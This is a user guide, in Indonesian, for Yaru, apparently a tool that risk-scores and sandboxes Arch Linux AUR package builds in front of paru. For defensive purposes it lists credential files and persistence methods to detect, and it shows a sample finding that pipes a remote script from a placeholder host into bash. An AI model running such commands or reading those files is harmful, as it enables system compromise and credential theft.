# Yaru User Guide

Yaru adalah security decision layer untuk Arch Linux dan turunannya. Yaru
memeriksa package source, PKGBUILD, maintainer, dependency, threat
intelligence, dan perilaku build sebelum package dipercaya atau diteruskan ke 
`paru`.

Yaru bukan pengganti `pacman`, `paru`, atau `makepkg`. Yaru memeriksa dan
membatasi alur kerja mereka.

## 1\. Tujuan Yaru

Yaru menjawab pertanyaan:

> Apakah package, source, build script, dependency, dan perilaku build cukup
> aman untuk masuk ke sistem?

Yaru membantu mendeteksi:

- PKGBUILD yang mengunduh lalu menjalankan shell script remote.
- Obfuscation memakai Base64 atau hex escape.
- Akses ke credential seperti `~/.ssh`, `~/.gnupg`, browser profile, atau `
  /etc/shadow`.
- Persistence melalui systemd, cron, sudoers, atau setuid.
- Network request yang tidak wajar saat build.
- Perubahan maintainer dan perubahan PKGBUILD.
- Dependency baru yang mencurigakan.
- Host atau URL yang cocok dengan threat-intelligence IOC.
- Perilaku mencurigakan saat build berjalan di sandbox.

## 2\. Siapa Melakukan Apa


|Aktor|Tugas|
|-|-|
|User|Menjalankan command dan membaca verdict|
|Yaru|Menganalisis, memberi risk score, menerapkan policy, dan mencatat evidence|
|`paru`|Mencari, mengunduh, membangun, dan memasang package|
|`pacman`|Memasang atau menghapus package binary|
|`makepkg`|Membuat package dari PKGBUILD|
|Bubblewrap|Mengisolasi proses build|
|SQLite|Menyimpan snapshot, history, decision, dan IOC lokal|

## 3\. Model Kepercayaan

Yaru membagi sumber package ke trust zone.


|Zone|Sumber|Perlakuan|
|-|-|-|
|0|Official repository: `core`, `extra`, `multilib`|Fast path, tetap mengandalkan signature dan integrity check|
|1|Trusted repository, misalnya CachyOS|Signature, integrity, provenance, dan threat-intelligence|
|2|Third-party repository|Review provenance dan reputation lebih ketat|
|3|AUR|Full path: PKGBUILD, maintainer, dependency, IOC, risk policy|
|4|Unknown/custom source|Restricted path dan baseline risk tinggi|

AUR tidak otomatis dianggap malware. AUR dianggap belum dipercaya sampai
evidence cukup untuk keputusan.

## 4\. Risk Score dan Verdict

Yaru menghasilkan score deterministik `0–100`.


|Score|Verdict|Arti default|
|-|-|-|
|`0–29`|`ALLOW`|Risiko rendah, proses boleh lanjut|
|`30–59`|`WARN`|Ada risiko tambahan, tunduk pada `policy.on_warn`|
|`60–79`|`QUARANTINE`|Tidak boleh dipasang otomatis|
|`80–100`|`BLOCK`|Diblokir|

Score dijelaskan melalui beberapa komponen:

- Static analysis.
- PKGBUILD atau source change.
- Dependency change.
- Threat intelligence.
- Source trust zone.
- Build behavior.

Historical trust tidak mengalahkan current evidence. Package lama tetap
diperiksa ketika maintainer, source, dependency, atau PKGBUILD berubah.

## 5\. Instalasi dan Build

### Prasyarat

- Arch Linux atau distro turunan.
- Rust toolchain untuk build dari source.
- `bubblewrap` atau `bwrap` untuk sandbox.
- `paru` jika memakai gateway.
- `pacman` dan database `/var/lib/pacman` untuk dependency check saat sandbox
  build.

### Build Yaru

```bash
cargo build --release
sudo install -Dm755 target/release/yaru /usr/local/bin/yaru
```
Cek status:

```bash
yaru status
```
## 6\. Command Utama

### 6.1 `status`

Melihat kesiapan engine, database, policy, dan backend.

```bash
yaru status
```
Gunakan saat:

- Baru selesai instalasi.
- Mengubah konfigurasi.
- Memastikan SQLite dan sandbox tersedia.

### 6.2 `inspect`

Quick evaluation package tanpa install.

```bash
yaru inspect <package-name>
```
Contoh:

```bash
yaru inspect ripgrep-all
yaru inspect google-chrome
```
Output utama:

- Package name.
- Trust zone.
- Risk score.
- Verdict.
- Ringkasan alasan.

Gunakan `inspect` sebelum install package AUR baru.

### 6.3 `audit`

Deep analysis dengan semua finding dan evidence.

```bash
yaru audit <package-name>
```
Gunakan ketika:

- `inspect` menghasilkan `WARN`, `QUARANTINE`, atau `BLOCK`.
- Package punya maintainer baru.
- Package punya dependency baru.
- User ingin melihat baris PKGBUILD yang memicu risiko.

### 6.4 `explain`

Menjelaskan decision package.

```bash
yaru explain <package-name>
```
Gunakan untuk memahami alasan verdict, bukan untuk menghapus finding.

### 6.5 `history`

Melihat snapshot dan perubahan maintainer.

```bash
yaru history <package-name>
```
Gunakan untuk memeriksa:

- Kapan package pertama kali disimpan.
- Perubahan maintainer.
- Perubahan versi.
- Perubahan hash PKGBUILD.
- Perubahan dependency dan source URL.

### 6.6 `trust`

Melihat metrik trust atau reputation package.

```bash
yaru trust <package-name>
```
Trust membantu konteks. Trust tidak dapat mengalahkan evidence baru yang kritis.

### 6.7 `inspect-local`

Memeriksa directory lokal yang berisi PKGBUILD.

```bash
yaru inspect-local /path/to/pkgbuild-dir
```
Contoh:

```bash
yaru inspect-local ~/build/my-package
```
Command ini cocok untuk review source hasil clone AUR sebelum menjalankan 
`makepkg`.

### 6.8 `build`

Memeriksa PKGBUILD lokal lalu membangun di Bubblewrap sandbox.

Dry run:

```bash
yaru build /path/to/pkgbuild-dir --dry-run
```
Build nyata:

```bash
yaru build /path/to/pkgbuild-dir
```
Urutan kerja:

1.  Yaru membaca PKGBUILD dan file terkait.
2.  Yaru menjalankan static analysis.
3.  Yaru menghitung score dan verdict.
4.  `QUARANTINE` dan `BLOCK` langsung ditolak.
5.  `WARN` mengikuti `policy.on_warn`.
6.  Jika boleh lanjut, `makepkg --noconfirm` berjalan di sandbox.
7.  Output build dipindai behavioral heuristic.
8.  Suspicious behavior membuat artifact dianggap tidak tepercaya.
9.  Event behavior dicatat ke `events.jsonl`.

### 6.9 `sandbox`

Menjalankan command manual di Bubblewrap sandbox.

```bash
yaru sandbox /path/to/dir /usr/bin/true
yaru sandbox /path/to/dir /usr/bin/makepkg --noconfirm
```
Sandbox default:

- User namespace terisolasi.
- PID namespace terisolasi.
- Network mengikuti konfigurasi sandbox.
- `/usr` read-only.
- `/etc` read-only.
- `/var/lib/pacman` read-only.
- `/tmp` memakai tmpfs.
- `$HOME` dimask.

Sandbox membatasi dampak build. Sandbox bukan bukti bahwa package aman.

### 6.10 `allow-rule`

Whitelist rule tertentu pada mesin lokal.

```bash
yaru allow-rule <rule-id>
```
Gunakan hanya setelah review manual. Whitelist rule mengubah policy lokal dan
dapat mengurangi deteksi.

### 6.11 `ioc import`

Mengimpor indicator of compromise dari JSON atau YAML ke SQLite lokal.

```bash
yaru ioc import /path/to/indicators.json
yaru ioc import /path/to/indicators.yaml
```
IOC dipakai untuk mencocokkan host atau URL pada source package.

### 6.12 `gateway`

Mengevaluasi command `paru`, lalu meneruskannya ke binary `paru` asli.

```bash
yaru gateway -S <package-name>
yaru gateway -Syu
yaru gateway -Syyu
```
Gateway tidak menggantikan `paru`. Gateway mencari binary asli, menghapus flag
khusus Yaru, melakukan evaluasi, lalu meneruskan argumen yang relevan.

Dry run:

```bash
yaru gateway --dry-run -Syyu
```
## 7\. Use Case Utama

### Use Case A: Review package AUR baru

Tujuan: mengetahui risiko sebelum install.

```bash
yaru inspect my-aur-package
yaru audit my-aur-package
```
Flow:

```text
User memilih package
        ↓
Yaru mengambil metadata AUR
        ↓
Yaru klasifikasi trust zone
        ↓
Yaru membaca PKGBUILD dan source metadata
        ↓
Yaru scan static, dependency, maintainer, dan IOC
        ↓
Yaru hitung score
        ↓
ALLOW / WARN / QUARANTINE / BLOCK
```
### Use Case B: Build PKGBUILD lokal

Tujuan: build tanpa menjalankan recipe langsung di host.

```bash
yaru build ~/build/my-package --dry-run
yaru build ~/build/my-package
```
Flow:

```text
Directory lokal
        ↓
Static analysis
        ↓
Policy decision
        ↓
Jika boleh: Bubblewrap
        ↓
makepkg
        ↓
Behavior monitoring
        ↓
Artifact diterima atau ditandai untrusted
```
### Use Case C: Upgrade sistem dengan gateway

Tujuan: memeriksa AUR package sebelum `paru -Syu` atau `paru -Syyu`.

```bash
yaru gateway -Syyu
```
Flow:

```text
Yaru menerima argumen paru
        ↓
Yaru mencari AUR upgrade melalui paru -Qua
        ↓
Setiap package dievaluasi
        ↓
Official package memakai fast path
        ↓
AUR package melewati full security path
        ↓
Semua decision ditampilkan
        ↓
Tidak ada blocked package: paru dijalankan
Ada blocked package: upgrade ditolak
```
### Use Case D: Upgrade aman dengan package diblokir

Tanpa skip:

```bash
yaru gateway -Syyu
```
Jika satu package diblokir, Yaru menghentikan seluruh forwarding. User dapat
memeriksa package itu dengan:

```bash
yaru audit <blocked-package>
yaru history <blocked-package>
yaru explain <blocked-package>
```
Jika fitur skip sudah tersedia pada versi yang digunakan, user dapat memilih:

```bash
yaru gateway --auto-skip -Syyu
yaru gateway --skip-blocked -Syyu
yaru gateway --interactive -Syyu
```
Perilaku yang diharapkan:

1.  Yaru mengevaluasi semua package.
2.  Package `BLOCK` atau `QUARANTINE` dicatat sebagai blocked.
3.  Di terminal interaktif (mode `--interactive` / `-i`):
    - `[s]` Skip blocked package(s) dan lanjut (default).
    - `[d]` Tampilkan detail temuan/audit lalu kembali ke prompt.
    - `[a]` Meminta konfirmasi override per-package via `--allow`.
    - `[q]` Batalkan seluruh proses forwarding.
4.  Mode `--auto-skip` langsung menyisipkan `--ignore <package>` tanpa prompt.
5.  Package aman tetap di-upgrade, package berbahaya tidak disentuh.
6.  Pada non-TTY / CI, gateway tetap fail-closed (otomatis abort jika ada risiko).

### Use Case E: Investigasi package berubah

```bash
yaru history package-name
yaru trust package-name
yaru audit package-name
```
Gunakan ketika maintainer berubah, package keluar dari status orphan,
dependency bertambah, atau PKGBUILD berubah besar.

### Use Case F: Update threat intelligence

```bash
yaru ioc import ~/Downloads/ioc-feed.json
yaru inspect suspicious-package
```
IOC dipakai sebagai evidence tambahan. IOC match tidak boleh dibaca tanpa
melihat konteks source dan finding lain.

## 8\. Activity Flow Lengkap

```text
[Start]
   ↓
User menjalankan inspect, build, atau gateway
   ↓
Yaru load configuration
   ↓
Config valid?
 ┌─No──────────────→ Fail loud, tidak lanjut
 │
 Yes
   ↓
Classify source dan trust zone
   ↓
Official?
 ┌─Yes─────────────→ Fast path: signature/integrity/provenance
 │
 No
   ↓
Ambil metadata, PKGBUILD, source URL, dependency
   ↓
Static analysis + deobfuscation
   ↓
Maintainer/snapshot/diff analysis
   ↓
Dependency graph analysis
   ↓
Threat-intelligence matching
   ↓
Risk scoring 0–100
   ↓
Policy verdict
   ├─ALLOW──────────→ Boleh lanjut
   ├─WARN───────────→ Ikuti policy.on_warn
   ├─QUARANTINE────→ Tahan atau skip eksplisit
   └─BLOCK──────────→ Tahan atau skip eksplisit
   ↓
Jika build diizinkan: jalankan Bubblewrap
   ↓
Monitor output behavior
   ↓
Behavior suspicious?
 ├─Yes─────────────→ Artifact untrusted, simpan event
 └─No──────────────→ Build/install boleh selesai
   ↓
[End]
```
## 9\. Decision Flow `gateway`

```text
[paru command]
      ↓
[y aru gateway menerima argumen]
      ↓
[Parse action dan package targets]
      ├── Non-install/query → forward langsung
      ├── Install package   → evaluasi target eksplisit
      └── Upgrade           → query paru -Qua lalu evaluasi AUR upgrades
                                  ↓
                         [Evaluate each package]
                                  ↓
                         [Blocked package ditemukan?]
                           ├── Tidak → forward argumen asli
                           ├── Ya + tanpa skip → abort batch
                           └── Ya + auto-skip → inject --ignore per package
                                  ↓
                              [paru asli]
```
Catatan: flag Yaru seperti `\--allow`, `\--auto-skip`, dan `\--skip-blocked`
tidak diteruskan ke `paru`.

## 10\. Decision Table


|Kondisi|Default|Dengan skip blocked|
|-|-|-|
|Semua package `ALLOW`|Forward|Forward|
|`WARN`, `on_warn=continue`|Forward|Forward|
|`WARN`, `on_warn=block`|Abort|Abort|
|`QUARANTINE`|Abort|Tambah `\--ignore`|
|`BLOCK`|Abort|Tambah `\--ignore`|
|`\--allow \<pkg>`|Override satu run|Override satu run|
|Query non-install|Forward|Forward|
|AUR query gagal|Log warning, lanjut sesuai flow|Sama|

`\--allow` adalah override eksplisit satu kali. Override tidak menghapus
finding, tidak mengubah snapshot, dan tidak membuat package trusted permanen.

## 11\. Konfigurasi Policy

Yaru membaca konfigurasi lokal. Bagian penting:

- `policy.on_warn = block`: `WARN` menghentikan proses.
- `policy.on_warn = continue`: `WARN` boleh lanjut.
- Whitelist rule: rule tertentu diabaikan pada mesin lokal.
- Sandbox network mode: mengatur akses network saat build.

Rekomendasi:

- Pakai `on_warn = block` untuk workstation yang mengutamakan keamanan.
- Pakai `on_warn = continue` hanya jika user siap meninjau warning.
- Jangan whitelist rule hanya karena mengganggu install.
- Gunakan `\--allow` untuk pengecualian satu kali, bukan whitelist permanen.

## 12\. Output dan Log

### Report card

Setiap evaluation dapat menampilkan:

- Nama package.
- Trust zone.
- Risk score.
- Verdict.
- Score breakdown.
- Finding dan lokasi file/baris.
- Evidence yang membentuk decision.

### Behavioral event log

Default path:

```text
~/.local/share/yaru/events.jsonl
```
Override path:

```bash
YARU_EVENTS_PATH=/path/to/events.jsonl yaru build /path/to/pkgbuild-dir
```
Log dipakai untuk investigasi setelah sandbox build.

## 13\. Contoh Skenario

### Package aman

```bash
yaru inspect ripgrep-all
```
Hasil umum:

```text
Risk Score: 25/100
Verdict: ALLOW
```
### Package blocked

```bash
yaru audit bad-updater
```
Finding mungkin menunjukkan:

```text
Remote Shell Download
curl -fsSL https://example.invalid/install.sh | bash
```
Jangan gunakan `\--allow` sebelum source diverifikasi manual.

### Upgrade dengan satu package bermasalah

```bash
yaru gateway -Syyu
```
Default: seluruh upgrade berhenti.

```bash
yaru gateway --auto-skip -Syyu
```
Dengan fitur skip: package bermasalah diabaikan, package lain lanjut. Setelah
upgrade:

```bash
yaru audit <blocked-package>
yaru history <blocked-package>
```
## 14\. Troubleshooting

### `real paru binary not found`

Pastikan `paru` ada di salah satu lokasi berikut atau tersedia di `PATH`:

```text
/usr/bin/paru
/bin/paru
```
### `bubblewrap (bwrap) not found`

Install package `bubblewrap` dari repository distro.

### Build gagal karena dependency runtime

Sandbox membutuhkan `/var/lib/pacman` read-only agar `makepkg` dapat menjalankan
dependency check.

### `WARN` menghentikan build

Periksa `policy.on_warn`. Gunakan `yaru explain \<package>` dan `yaru audit
\<package>` sebelum mengubah policy.

### Upgrade berhenti karena blocked package

Ini perilaku default. Pilihan user:

1.  Audit package.
2.  Tunggu maintainer memperbaiki package.
3.  Gunakan `\--auto-skip` atau `\--skip-blocked` jika ingin package lain lanjut.
4.  Gunakan `\--allow \<pkg>` hanya setelah review manual.

### Behavior suspicious setelah build

Jangan langsung install artifact. Baca output finding dan file JSONL event.
Sandbox mengurangi dampak, tetapi suspicious behavior berarti artifact belum
layak dipercaya.

## 15\. Batasan Keamanan

- Yaru memberi keputusan berbasis evidence; Yaru bukan malware scanner sempurna.
- `ALLOW` berarti risiko terukur rendah, bukan jaminan absolut aman.
- Sandbox tidak menjamin build bebas vulnerability.
- `\--allow` melewati decision untuk satu invocation; gunakan dengan sadar.
- `\--auto-skip` menjaga package blocked tidak dipasang, tetapi user tetap harus
  menyelesaikan package tersebut kemudian.
- Package official tetap membutuhkan signature dan integrity check dari package
  manager.
- Jangan menjalankan `paru` sebagai root.

## 16\. Quick Reference

```bash
# Status
yaru status
# Review package
yaru inspect <pkg>
yaru audit <pkg>
yaru explain <pkg>
yaru history <pkg>
yaru trust <pkg>
# Local PKGBUILD
yaru inspect-local /path/to/pkgbuild
yaru build /path/to/pkgbuild --dry-run
yaru build /path/to/pkgbuild
yaru sandbox /path/to/pkgbuild /usr/bin/makepkg --noconfirm
# IOC
yaru ioc import /path/to/feed.json
yaru ioc sync
yaru ioc sync https://example.com/iocs.json
# Allow rule
yaru allow-rule <rule-id>
yaru allow-rule remove <rule-id>
# Report
yaru report --today
yaru report --days 7 --json
# Systemd user timer (opsional)
mkdir -p ~/.config/systemd/user
cp packaging/systemd/yaru-ioc-sync.{service,timer} ~/.config/systemd/user/
systemctl --user daemon-reload
systemctl --user enable --now yaru-ioc-sync.timer
# Paru gateway
yaru gateway --dry-run -S <pkg>
yaru gateway -S <pkg>
yaru gateway -Syyu
yaru gateway --auto-skip -Syyu
yaru gateway --skip-blocked -Syyu
# One-run override
paru --allow <pkg> -Syyu
```

